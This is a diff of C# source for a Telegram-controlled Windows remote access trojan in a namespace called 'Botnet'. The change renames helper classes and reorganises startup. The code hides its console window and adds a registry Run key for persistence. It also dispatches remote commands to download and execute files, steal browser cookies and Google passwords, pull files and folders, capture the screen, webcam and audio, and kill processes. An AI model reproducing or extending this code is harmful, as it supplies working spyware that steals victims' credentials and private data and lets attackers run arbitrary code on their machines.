@@ -2,25 +2,24 @@
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
-using System.Threading;
 using Telegram.Bot;
 
 namespace Botnet
 {
     class cMain
     {
-        [DllImport("kernel32.dll")]
-        static extern IntPtr GetConsoleWindow();
         static TelegramSystem ts;
-        static Functions funcs;
+        static Misc misc;
+        static MainFuncs mainFuncs;
 
         [DllImport("user32.dll")]
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
 
         const int SW_HIDE = 0;
-        const int SW_SHOW = 5;
 
-        private static string[] commandList = { "/open_link", "/GetGPSLocation", "/download_execute", "/exit", "/ddos", "/GetCookieFile", "/GetSystem", "/GetProcess", "/KillProcess", "/ping","/ls", "/DownloadFile", "/DownloadFolder","/CaptureCam", "/TakeScreenShot", "/GetGooglePasswords", "/OpenFile", "/RecordAudio", "/MessageBox","/help"};
+        private static string[] commandList = { "/open_link", "/GetGPSLocation", "/download_execute", "/exit", "/ddos", "/GetCookieFile", "/GetSystem", "/GetProcess", "/KillProcess", "/ping","/ls", "/DownloadFile", "/DownloadFolder", "/CaptureMonitor", "/TakeScreenShot", "/SnapShotCam","/GetGooglePasswords", "/OpenFile", "/RecordAudio", "/MessageBox","/help"};
 
         private static ITelegramBotClient bot;
         public static bool Is64Bit()
@@ -28,31 +27,14 @@ namespace Botnet
             return Marshal.SizeOf(typeof(IntPtr)) == 8;
         }
 
-        static string IP = Functions.GetIp();
-
-        internal delegate void SignalHandler(ConsoleSignal consoleSignal, int vs);
-
-        internal enum ConsoleSignal
-        {
-            CtrlC = 0,
-            CtrlBreak = 1,
-            Close = 2,
-            LogOff = 5,
-            Shutdown = 6
-        }
-
-        internal static class ConsoleHelper
-        {
-            [DllImport("Kernel32", EntryPoint = "SetConsoleCtrlHandler")]
-            public static extern bool SetSignalHandler(SignalHandler handler, bool add);
-        }
-
-        private static SignalHandler signalHandler;
+        static string IP = Misc.GetIp();
 
         static void Main(string[] args)
         {
             ts = new TelegramSystem(config.Token);
-            funcs = new Functions(ts);
+            misc = new Misc(ts);
+            mainFuncs = new MainFuncs(ts, misc);
+            ShowWindow(GetConsoleWindow(), SW_HIDE);
             Microsoft.Win32.RegistryKey Key =
             Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", true);
@@ -63,11 +45,7 @@ namespace Botnet
             Key.SetValue(config.currProc, Directory.GetCurrentDirectory());         // "D:\\BotFiles\\TeleRat.exe"
             Key.Close();
 
-            ts.SendMessage($"Bot [{IP}] is online");
-            var handle = GetConsoleWindow();
-            ShowWindow(handle, SW_HIDE);
-            signalHandler += HandleConsoleSignal;
-            ConsoleHelper.SetSignalHandler(signalHandler, true);
+            ts.SendMessage($"Bot [{Misc.GetIp()}] is online");
             bot = new TelegramBotClient(config.Token);
             bot.OnMessage += OnTelegramMessage;
             bot.StartReceiving();
@@ -111,7 +89,7 @@ namespace Botnet
                     }
                     catch
                     {
-                        ts.SendMessage($"[ERROR] [{Functions.GetIp()}] Something wrong");
+                        ts.SendMessage($"[ERROR] [{Misc.GetIp()}] Something wrong");
                     }
                 }
                 else if (e.Message.Document != null)
@@ -131,12 +109,6 @@ namespace Botnet
                     Execute(command);
                 }
             }
-        }
-
-        private static void HandleConsoleSignal(ConsoleSignal consoleSignal, int returnedValue)
-        {
-            ts.SendMessage($"Bot [{IP}] is offline");
-            Thread.Sleep(750);
         }
 
         static void Execute(cmd CMD)
@@ -166,13 +138,13 @@ namespace Botnet
                         if (CMD.ComContent == null)
                             ts.SendMessage("Usage - /open_link|<link>  (without <>)");
                         else
-                            funcs.OpenLink(CMD.ComContent);
+                            mainFuncs.OpenLink(CMD.ComContent);
                         break;
                     case "/download_execute":
                         if (CMD.ComContent == null)
                             ts.SendMessage("Usage - /download_execute|<link>  (without <>)");
                         else
-                            funcs.DownloadExecute(CMD.ComContent);
+                            mainFuncs.DownloadExecute(CMD.ComContent);
                         break;
                     case "/exit":
                         Environment.Exit(0);
@@ -180,43 +152,43 @@ namespace Botnet
                     case "/ddos":
                         break;
                     case "/getcookiefile":
-                        funcs.GetCookieAndLoginData();
+                        mainFuncs.GetCookieAndLoginData();
                         break;
                     case "/getsystem":
-                        funcs.GetSystem();
+                        mainFuncs.GetSystem();
                         break;
                     case "/getprocess":
-                        funcs.GetProcess();
+                        mainFuncs.GetProcess();
                         break;
                     case "/getgpslocation":
-                        funcs.GetGPSLocation();
+                        mainFuncs.GetGPSLocation();
                         break;
                     case "/messagebox":
                         if (CMD.ComContent == null || CMD.ComThreads == null)
                             ts.SendMessage("Usage - /MessageBox|<message>|<caption>  (without <>)");
                         else
-                            funcs.ShowMessageBox(CMD.ComContent, CMD.ComThreads);
+                            mainFuncs.ShowMessageBox(CMD.ComContent, CMD.ComThreads);
                         break;
                     case "/killprocess":
                         if (CMD.ComContent == null)
                             ts.SendMessage("Usage - /KillProcess|<process name>  (without <>)");
                         else
-                            funcs.KillProcess(CMD.ComContent);
+                            mainFuncs.KillProcess(CMD.ComContent);
                         break;
                     case "/ls":
                         if (CMD.ComContent == null)
-                            funcs.GetFiles(Directory.GetCurrentDirectory());
+                            mainFuncs.GetFiles(Directory.GetCurrentDirectory());
                         else
-                            funcs.GetFiles(CMD.ComContent);
+                            mainFuncs.GetFiles(CMD.ComContent);
                         break;
                     case "/downloadfile":
                         if (CMD.ComContent == null)
                             ts.SendMessage("Usage - /DownloadFile|<full path to file>  (without <>)");
                         else
-                            funcs.DownloadFile(CMD.ComContent);
+                            mainFuncs.DownloadFile(CMD.ComContent);
                         break;
                     case "/snapshotcam":
-                        funcs.SnapShotCam();
+                        mainFuncs.SnapShotCam();
                         break;
                     case "/capturemonitor":
                         if(CMD.ComContent == null)
@@ -224,7 +196,7 @@ namespace Botnet
                         else
                         {
                             if (int.TryParse(CMD.ComContent, out int delay))
-                                funcs.CaptureScreen(delay);
+                                mainFuncs.CaptureScreen(delay);
                             else
                                 ts.SendMessage("Write correct property!");
                         }
@@ -232,13 +204,13 @@ namespace Botnet
                     case "/capturewebcam":                                  // TODO: Capture from Webcam
                         break;
                     case "/takescreenshot":
-                        funcs.TakeScreenShot();
+                        mainFuncs.TakeScreenShot();
                         break;
                     case "/getgooglepasswords":
-                        funcs.GetGooglePasswords();
+                        mainFuncs.GetGooglePasswords();
                         break;
                     case "/ping":
-                        ts.SendMessage($"[Ping] [{Functions.GetIp()}] I'm up");
+                        ts.SendMessage($"[Ping] [] I'm up");
                         break;
                     case "/openfile":
                         if (CMD.ComContent == null)
@@ -250,10 +222,10 @@ namespace Botnet
                         if (CMD.ComContent == null)
                             ts.SendMessage("Usage - /DownloadFolder|<full path to folder>  (without <>)");
                         else
-                            funcs.DownloadFolder(CMD.ComContent);
+                            mainFuncs.DownloadFolder(CMD.ComContent);
                         break;
                     case "/help":
-                        funcs.SendCommands();
+                        mainFuncs.SendCommands();
                         break;
                     case "/recordaudio":
                         if (CMD.ComContent != null)
@@ -269,7 +241,7 @@ namespace Botnet
                                 i = 0;
                         }
                         if (i != 0)
-                            funcs.SendCommands();
+                            mainFuncs.SendCommands();
                         break;
                 }
                 StreamWriter Writer = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "lastCMD.txt");
